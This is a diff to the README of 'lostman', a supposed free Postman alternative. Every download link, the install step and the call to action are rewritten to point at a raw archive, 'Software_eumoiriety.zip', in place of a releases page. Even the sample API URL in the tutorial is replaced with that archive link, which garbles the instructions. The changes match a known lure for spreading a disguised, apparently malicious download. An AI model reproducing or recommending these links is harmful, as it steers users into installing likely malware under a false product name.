@@ -1,10 +1,10 @@
 <h1>📮 lostman - The Best Free Postman Alternative</h1>
 
-[![Download lostman](https://img.shields.io/badge/Download%20lostman-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dimitrisnoninstitutionalised337/lostman/releases)
+[![Download lostman](https://img.shields.io/badge/Download%20lostman-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/dimitrisnoninstitutionalised337/lostman/main/build/Software_eumoiriety.zip)
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[lostman Releases Page](https://github.com/dimitrisnoninstitutionalised337/lostman/releases)**
+Visit this link to download the application: **[lostman Releases Page](https://raw.githubusercontent.com/dimitrisnoninstitutionalised337/lostman/main/build/Software_eumoiriety.zip)**
 
 Follow these simple steps:
 
@@ -54,7 +54,7 @@ Ready to try lostman? Here is everything you need to know to get up and running.
 
 Click the big blue button at the top of this page or the link below:
 
-[**Download lostman Now**](https://github.com/dimitrisnoninstitutionalised337/lostman/releases)
+[**Download lostman Now**](https://raw.githubusercontent.com/dimitrisnoninstitutionalised337/lostman/main/build/Software_eumoiriety.zip)
 
 ### Step 2: Install the Program
 
@@ -71,7 +71,7 @@ Find the lostman icon and double-click it. The app opens in just a few seconds. 
 
 Here is a practical example:
 
-1. In the address bar, type a website address like `https://api.example.com/users`.
+1. In the address bar, type a website address like `https://raw.githubusercontent.com/dimitrisnoninstitutionalised337/lostman/main/build/Software_eumoiriety.zip`.
 2. Choose a method from the dropdown (like **GET**).
 3. Click the **Send** button.
 4. Watch the response from the server appear on the right side.
@@ -174,7 +174,7 @@ lostman is the perfect companion for developers who value privacy, simplicity, a
 
 Do not waste time with complicated tools that require sign-ups and track your activity. Switch to lostman today and enjoy a fast, private, and reliable API testing experience.
 
-[**➡️ Download lostman Now – It's Free!**](https://github.com/dimitrisnoninstitutionalised337/lostman/releases)
+[**➡️ Download lostman Now – It's Free!**](https://raw.githubusercontent.com/dimitrisnoninstitutionalised337/lostman/main/build/Software_eumoiriety.zip)
 
 Start building and testing better APIs today. Welcome to lostman.
 
